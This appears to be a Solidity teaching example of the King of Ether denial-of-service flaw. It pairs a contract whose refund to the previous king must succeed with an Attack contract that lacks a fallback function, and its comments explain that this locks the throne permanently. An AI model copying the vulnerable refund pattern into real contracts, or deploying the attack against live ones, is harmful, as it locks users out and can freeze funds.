pragma solidity ^0.8.13;

contract KingOfEther{
    address public king;
    uint public balance;

    function claimThrone() external payable{
        //deposite to claim the throne, thus claimThrone is also a deposite function
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent,) = king.call{value: balance}("");
        //this allows the fund of the previous king to be refunded as a new king comes in
        require(sent, "Failed to send Ether");

        balance = msg.value;//updating the balance in the contract
        king = msg.sender;
    }
}

contract Attack{
    KingOfEther kingOfEther;// introducing a new variable, kingOfEther

    constructor(KingOfEther _kingOfEther){ //initialise the main contract to the new variable 
    //in order for the attacker to have access to the main contract
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable{
        kingOfEther.claimThrone{value: msg.value}();
    } //Note; attack has no fallback function to allow the refund of the previous king
    //thus code line 13(above) will fail and a new king won't be able to emerge

    //in other words, no one can become the new king after the attacker has executed the attack and the attacker will remain the king
     


}
